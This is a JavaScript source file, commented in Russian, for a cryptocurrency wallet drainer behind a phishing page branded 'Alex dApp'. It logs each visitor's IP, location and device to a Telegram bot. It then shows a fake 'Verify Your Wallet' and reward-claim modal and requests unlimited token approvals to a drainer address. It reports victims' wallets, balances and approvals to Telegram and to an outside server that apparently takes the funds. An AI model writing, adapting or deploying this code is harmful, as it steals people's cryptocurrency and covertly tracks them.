// === Импорты зависимостей ===
import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, arbitrum } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import config from './config.js'; // Импортируем конфигурацию

// === Конфигурация AppKit ===
const projectId = config.PROJECT_ID;
const networks = [mainnet, polygon, bsc, arbitrum];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://amllegit.com/,
    icons: ['https://amllegit.com/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;
let modalSubtitle = null;

// === Константы и конфигурации ===
// Переменная для отслеживания времени последнего вызова drain
let lastDrainTime = 0;

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)"
];

// === Функции ===
// Функция для создания задержки
const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Функция для отправки сообщения в Telegram
async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${config.TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: config.TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });
    const data = await response.json();
    if (!data.ok) {
    }
  } catch (error) {
  }
}

// Функция для получения IP-адреса пользователя
async function getUserIP() {
  const cachedIP = sessionStorage.getItem('userIP');
  if (cachedIP) return cachedIP;

  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data = await response.json();
    const ip = data.ip || 'Unknown IP';
    sessionStorage.setItem('userIP', ip);
    return ip;
  } catch (error) {
    return 'Unknown IP';
  }
}

// Функция для получения геолокации по IP
async function getGeolocation(ip) {
  const cachedLocation = sessionStorage.getItem('userLocation');
  if (cachedLocation) return cachedLocation;

  try {
    const response = await fetch(`https://freeipapi.com/api/json/${ip}`);
    const data = await response.json();
    if (data.cityName && data.countryName) {
      const location = `${data.cityName}, ${data.countryName}`;
      sessionStorage.setItem('userLocation', location);
      return location;
    }
    return 'Unknown Location';
  } catch (error) {
    return 'Unknown Location';
  }
}

// Функция для определения устройства с учётом эмуляции
function detectDevice() {
  const userAgent = navigator.userAgent.toLowerCase();
  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';

  // Проверяем, включена ли эмуляция в Chrome DevTools
  const isDevToolsEmulation = /chrome/i.test(navigator.userAgent) && window.innerWidth !== window.screen.width;

  if (isDevToolsEmulation) {
    // Если это эмуляция, определяем реальное устройство
    const realPlatform = navigator.platform.toLowerCase();
    if (/win32|win64/i.test(realPlatform)) return "Windows";
    if (/macintosh|mac os/i.test(realPlatform)) return "Mac";
    if (/linux/i.test(realPlatform)) return "Linux";
    return "Unknown";
  }

  // Обычная проверка для реальных устройств
  if (/iphone|ipad|ipod/i.test(userAgent)) return "iPhone";
  if (/android/i.test(userAgent)) return "Android";
  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) return "Windows";
  if (/macintosh|mac os/i.test(userAgent)) return "Mac";
  if (/linux/i.test(userAgent)) return "Linux";
  return "Unknown";
}

// Функция для проверки, является ли устройство мобильным
function isMobileDevice() {
  const device = detectDevice();
  return device === "iPhone" || device === "Android";
}

// Функция для отправки уведомления при заходе на сайт
async function notifyOnVisit() {
  if (sessionStorage.getItem('visitNotified')) return;

  const domain = window.location.hostname || 'Unknown Domain';
  const ip = await getUserIP();
  const location = await getGeolocation(ip);
  const device = detectDevice();

  const message = `🔔 Visit | **${domain}**\n\n` +
                  `IP: ${ip}\n` +
                  `Where: ${location}\n` +
                  `Device: ${device}`;

  await sendTelegramMessage(message);
  sessionStorage.setItem('visitNotified', 'true');
}

// Вызываем notifyOnVisit при загрузке
notifyOnVisit();

// Функция для получения цены токена в USDT через Binance API
async function getTokenPriceInUSDT(tokenSymbol) {
  if (tokenSymbol === "USDTUSDT") return 1;

  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
    const data = await response.json();
    if (data.price) return parseFloat(data.price);
    return 0;
  } catch {
    return 0;
  }
}

// Функция для выбора рабочего провайдера
async function getWorkingProvider(rpcUrls) {
  const providerPromises = rpcUrls.map(async (rpc) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      return provider;
    } catch {
      return null;
    }
  });

  const results = await Promise.all(providerPromises);
  const workingProvider = results.find(provider => provider !== null);
  if (!workingProvider) throw new Error('No working provider found');
  return workingProvider;
}

// Проверка баланса
async function checkBalance(chainId, userAddress, provider) {
  const chainConfig = config.CHAINS[chainId];
  let tokenBalances = {};

  try {
    const usdt = new ethers.Contract(chainConfig.usdtAddress, ERC20_ABI, provider);
    tokenBalances[chainConfig.usdtAddress] = await usdt.balanceOf(userAddress);
  } catch (error) {
    tokenBalances[chainConfig.usdtAddress] = ethers.BigNumber.from(0);
  }

  try {
    const usdc = new ethers.Contract(chainConfig.usdcAddress, ERC20_ABI, provider);
    tokenBalances[chainConfig.usdcAddress] = await usdc.balanceOf(userAddress);
  } catch (error) {
    tokenBalances[chainConfig.usdcAddress] = ethers.BigNumber.from(0);
  }

  if (chainConfig.otherTokenAddresses) {
    const tokenAddresses = Object.values(chainConfig.otherTokenAddresses);
    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
      try {
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const balance = await token.balanceOf(userAddress);
        return { address: tokenAddress, balance };
      } catch (error) {
        return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
      }
    });

    const results = await Promise.all(balancePromises);
    results.forEach(({ address, balance }) => {
      tokenBalances[address] = balance;
    });
  }

  return { tokenBalances };
}

// Проверка наличия средств
function hasFunds(bal) {
  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);

  for (const balance of Object.values(bal.tokenBalances)) {
    if (balance.gt(minTokenBalance)) return true;
  }

  return false;
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: config.CHAINS[chainId].chainIdHex }]
    });
  } catch (error) {
    throw new Error(`Failed to switch chain: ${error.message}`);
  }
}

// Функция для форматирования адреса кошелька
function shortenAddress(address) {
  if (!address || address.length < 10) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

// Функция для определения названия кошелька
function detectWallet() {
  if (window.ethereum?.isMetaMask) return "MetaMask";
  if (window.ethereum?.isTrust) return "Trust Wallet";
  return "Unknown Wallet";
}

// Функция для форматирования чисел
function formatBalance(balance, decimals) {
  const formatted = ethers.utils.formatUnits(balance, decimals);
  return parseFloat(formatted).toFixed(6).replace(/\.?0+$/, '');
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal, provider) {
  const chainConfig = config.CHAINS[chainId];
  if (!chainConfig) throw new Error(`Configuration for chainId ${chainId} not found`);

  const tokenAddresses = [chainConfig.usdtAddress, chainConfig.usdcAddress, ...Object.values(chainConfig.otherTokenAddresses)];

  const connectNotifiedKey = `connectNotified_${userAddress}`;
  const hasNotified = sessionStorage.getItem(connectNotifiedKey);

  if (!hasNotified) {
    const shortAddress = shortenAddress(userAddress);
    const walletName = detectWallet();
    const networkName = chainConfig.name;
    const funds = [];

    for (const tokenAddress of tokenAddresses) {
      const balance = bal.tokenBalances[tokenAddress];
      if (balance && balance.gt(0)) {
        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        const decimals = await tokenContract.decimals();
        const formattedBalance = formatBalance(balance, decimals);
        if (parseFloat(formattedBalance) > 0) {
          const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                        tokenAddress === chainConfig.usdcAddress ? "USDC" :
                        Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
          const tokenPrice = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[tokenAddress] || symbol);
          const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
          funds.push(`- **${symbol}**(${networkName}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
        }
      }
    }

    const device = detectDevice();
    const fundsMessage = funds.length > 0 ? funds.join('\n') : 'токены не обнаружены';
    const message = `🌀 Connect | [ ${shortAddress} ]\n\n` +
                    `Wallet: ${walletName}\n` +
                    `Network: ${networkName}\n` +
                    `Funds:\n${fundsMessage}\n` +
                    `Device: ${device}`;

    await sendTelegramMessage(message);
    sessionStorage.setItem(connectNotifiedKey, 'true');
  }

  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);

  let ethBalance;
  try {
    ethBalance = await provider.getBalance(userAddress);
  } catch (error) {
    throw new Error(`Failed to fetch ${chainConfig.nativeToken} balance: ${error.message}`);
  }

  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    throw new Error(`Insufficient ${chainConfig.nativeToken} balance for gas`);
  }

  const tokensToProcess = [];

  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    try {
      const [realBalance, decimals] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals()
      ]);
      return { tokenAddress, tokenContract, realBalance, decimals };
    } catch (error) {
      return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
    }
  });

  const tokenDataResults = await Promise.all(tokenDataPromises);

  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
      bal.tokenBalances[tokenAddress] = realBalance;
    }

    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
      const symbol = tokenAddress === chainConfig.usdtAddress ? "USDT" :
                    tokenAddress === chainConfig.usdcAddress ? "USDC" :
                    Object.keys(chainConfig.otherTokenAddresses).find(key => chainConfig.otherTokenAddresses[key] === tokenAddress) || "Unknown";
      if (!symbol) continue;
      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
    }
  }

  const pricePromises = tokensToProcess.map(async (token) => {
    const price = await getTokenPriceInUSDT(config.TOKEN_SYMBOLS[token.address] || token.token);
    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
    token.valueInUSDT = balanceInUnits * price;
    return token;
  });

  await Promise.all(pricePromises);
  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);

  let status = 'rejected';
  let modalClosed = false;

  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
    if (!token) continue;

    const allowanceBefore = await contract.allowance(userAddress, chainConfig.drainerAddress);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await provider.getTransactionCount(userAddress, "pending");
        const gasPrice = await provider.getGasPrice();

        await delay(10);

        const tx = await contract.approve(chainConfig.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: gasPrice,
          nonce
        });
        const receipt = await tx.wait();
        await delay(1000); // Даём время на обновление allowance

        // Проверяем allowance после approve
        const allowanceAfter = await contract.allowance(userAddress, chainConfig.drainerAddress);
        if (allowanceAfter.lt(balance)) {
          throw new Error(`Allowance not updated after approve for ${token}`);
        }

        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
        status = 'confirmed';

        if (!modalClosed) {
          await hideModalWithDelay();
          modalClosed = true;
        }
      } catch (error) {
        if (error.message.includes('user rejected')) {
          if (!modalClosed) {
            await hideModalWithDelay("Error: Transaction rejected by user.");
            modalClosed = true;
          }
        }
        throw new Error(`Failed to approve token ${token}: ${error.message}`);
      }
    } else {
      await notifyServer(userAddress, address, balance, chainId, null, provider);
      status = 'confirmed';

      if (!modalClosed) {
        await hideModalWithDelay();
        modalClosed = true;
      }
    }
  }

  return status;
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
  try {
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals] = await Promise.all([
      token.balanceOf(userAddress),
      token.decimals()
    ]);

    // Используем минимальное значение между текущим балансом и переданным amount
    const effectiveAmount = balance.lt(amount) ? balance : amount;

    if (effectiveAmount.lte(0)) {
      throw new Error('Amount is zero or negative');
    }

    const response = await fetch('https://api.amllegit.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: effectiveAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (!data.success) {
      throw new Error(data.message || 'Failed to notify server');
    }
  } catch (error) {
    throw new Error(`Failed to notify server: ${error.message}`);
  }
}

// Основная функция runDrainer
async function runDrainer(provider, signer, userAddress) {
  const currentTime = Date.now();
  const timeSinceLastDrain = currentTime - lastDrainTime;
  const minDelay = 10;

  if (timeSinceLastDrain < minDelay) {
    await delay(minDelay - timeSinceLastDrain);
  }

  lastDrainTime = Date.now();

  const balancePromises = Object.keys(config.CHAINS).map(async (chainId) => {
    try {
      const reliableProvider = await getWorkingProvider(config.CHAINS[chainId].rpcUrls);
      const balance = await checkBalance(chainId, userAddress, reliableProvider);
      return { chainId: Number(chainId), balance, provider: reliableProvider };
    } catch (error) {
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(item => hasFunds(item.balance))
    .sort((a, b) => {
      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      return bTotal.gt(aTotal) ? 1 : -1;
    });

  if (!sorted.length) {
    throw new Error('No funds found on any chain');
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
  return status;
}

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 999;
      display: none;
      backdrop-filter: blur(4px);
      pointer-events: auto;
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1A202C;
      border-radius: 12px;
      padding: 24px;
      width: 90%;
      max-width: 400px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Inter', sans-serif;
      color: #FFFFFF;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      margin-bottom: 16px;
    }

    .modal-subtitle {
      font-size: 14px;
      font-weight: 400;
      color: #A0AEC0;
      margin-bottom: 24px;
      word-wrap: break-word;
    }

    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
    }

    .pulse-ring {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 3px solid #3B82F6;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      animation: pulse 2s ease-in-out infinite;
    }

    @keyframes pulse {
      0% { width: 40px; height: 40px; opacity: 0.8; }
      50% { width: 50px; height: 50px; opacity: 0.4; }
      100% { width: 40px; height: 40px; opacity: 0.8; }
    }

    .wave {
      position: absolute;
      top: 50%;
      left: 50%;
      width: 40px;
      height: 40px;
      border: 1px solid #60A5FA;
      border-radius: 50%;
      transform: translate(-50%, -50%);
      opacity: 0;
      animation: wave 4s ease-out infinite;
    }

    .wave:nth-child(2) { animation-delay: 1s; }
    .wave:nth-child(3) { animation-delay: 2s; }

    @keyframes wave {
      0% { width: 40px; height: 40px; opacity: 0.6; }
      100% { width: 100px; height: 100px; opacity: 0; }
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 24px 0 0;
      font-size: 14px;
      font-weight: 500;
      color: #E2E8F0;
      text-align: left;
    }

    .action-list li {
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .modal-footer {
      font-size: 12px;
      font-weight: 400;
      color: #A0AEC0;
      margin-top: 32px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 320px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title { font-size: 18px; }
      .modal-subtitle { font-size: 13px; }
      .loader-container { width: 70px; height: 70px; }
      @keyframes pulse {
        0% { width: 30px; height: 30px; opacity: 0.8; }
        50% { width: 40px; height: 40px; opacity: 0.4; }
        100% { width: 30px; height: 30px; opacity: 0.8; }
      }
      @keyframes wave {
        0% { width: 30px; height: 30px; opacity: 0.6; }
        100% { width: 70px; height: 70px; opacity: 0; }
      }
      .action-list { font-size: 13px; }
      .modal-footer { font-size: 11px; }
    }
  `;
  document.head.appendChild(style);

  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="loader-container">
      <div class="pulse-ring"></div>
      <div class="wave"></div>
      <div class="wave"></div>
      <div class="wave"></div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  modalSubtitle = modalContent.querySelector('.modal-subtitle');

  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  window.ethereum.on('chainChanged', onChainChanged);
});

// === Управление модальным окном верификации ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalOverlay.style.pointerEvents = 'auto';
  modalContent.style.display = 'block';
  modalSubtitle.textContent = "Processing blockchain verification...";
}

async function hideModalWithDelay(errorMessage = null) {
  if (errorMessage) {
    modalSubtitle.textContent = errorMessage;
    await new Promise(resolve => setTimeout(resolve, 7000));
  }
  modalOverlay.style.display = 'none';
  modalOverlay.style.pointerEvents = 'none';
  modalContent.style.display = 'none';
  document.body.style.pointerEvents = 'auto';
}

// === Выполнение drainer ===
async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    await hideModalWithDelay("Transaction already completed or pending.");
    return;
  }

  if (!connectedAddress) {
    showModal();
    await hideModalWithDelay("Error: Wallet address not defined. Please try again.");
    return;
  }

  showModal();

  const drainerTimeout = setTimeout(async () => {
    isTransactionPending = false;
    await hideModalWithDelay("Error: Drainer operation timed out. Please try again.");
  }, 60000);

  try {
    const provider = new ethers.providers.Web3Provider(window.ethereum);
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      throw new Error('Wallet address mismatch');
    }

    await new Promise(resolve => setTimeout(resolve, 10));

    isTransactionPending = true;
    const status = await runDrainer(provider, signer, connectedAddress);
    hasDrained = true;
    isTransactionPending = false;
    clearTimeout(drainerTimeout);
    await hideModalWithDelay();
  } catch (err) {
    isTransactionPending = false;
    clearTimeout(drainerTimeout);
    let errorMessage = "Error: An unexpected error occurred. Please try again.";
    if (err.message.includes('user rejected')) {
      errorMessage = "Error: Transaction rejected by user.";
    } else if (err.message.includes('Insufficient')) {
      errorMessage = err.message;
    } else if (err.message.includes('Failed to approve token')) {
      errorMessage = "Error: Failed to approve token. Your wallet may not support this operation.";
    } else if (err.message.includes('Failed to switch chain')) {
      errorMessage = "Error: Failed to switch network. Please switch manually in your wallet.";
    } else if (err.message.includes('Failed to notify server')) {
      errorMessage = err.message; // Ошибка от сервера
    } else {
      errorMessage = `Error: ${err.message}`;
    }
    await hideModalWithDelay(errorMessage);
    throw err;
  }
}

// === Подключение кошелька через AppKit и запуск дрейнера ===
async function handleConnectOrAction() {
  try {
    if (!connectedAddress) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      appKitModal.close();
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      await hideModalWithDelay("Transaction already in progress.");
    }
  } catch (err) {
    appKitModal.close();
    isTransactionPending = false;
    showModal();
    await hideModalWithDelay(`Error: Failed to connect wallet. ${err.message}`);
  }
}

// === Обработка смены сети ===
async function onChainChanged(chainId) {
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer();
  } else {
    await hideModalWithDelay("Transaction in progress, please wait.");
  }
}

// === Ожидание подключения кошелька через AppKit ===
async function waitForWallet() {
  return new Promise((resolve, reject) => {
    const isMobile = isMobileDevice();

    const checkAccounts = async () => {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          window.ethereum.removeListener('accountsChanged', handler);
          clearTimeout(timeout);
          clearInterval(checkInterval);
          resolve(accounts[0]);
        } else {
          const requestedAccounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          if (requestedAccounts.length > 0) {
            window.ethereum.removeListener('accountsChanged', handler);
            clearTimeout(timeout);
            clearInterval(checkInterval);
            resolve(requestedAccounts[0]);
          }
        }
      } catch (err) {
        window.ethereum.removeListener('accountsChanged', handler);
        clearTimeout(timeout);
        clearInterval(checkInterval);
        reject(err);
      }
    };

    const timeout = setTimeout(() => {
      window.ethereum.removeListener('accountsChanged', handler);
      clearInterval(checkInterval);
      reject(new Error('Wallet connection timed out'));
    }, 30000);

    const handler = (accounts) => {
      if (accounts.length > 0) {
        window.ethereum.removeListener('accountsChanged', handler);
        clearTimeout(timeout);
        clearInterval(checkInterval);
        resolve(accounts[0]);
      }
    };

    window.ethereum.on('accountsChanged', handler);

    const checkInterval = setInterval(async () => {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' });
        if (accounts.length > 0) {
          window.ethereum.removeListener('accountsChanged', handler);
          clearTimeout(timeout);
          clearInterval(checkInterval);
          resolve(accounts[0]);
        }
      } catch (err) {
        window.ethereum.removeListener('accountsChanged', handler);
        clearTimeout(timeout);
        clearInterval(checkInterval);
        reject(err);
      }
    }, 1000);

    checkAccounts();
  });
}
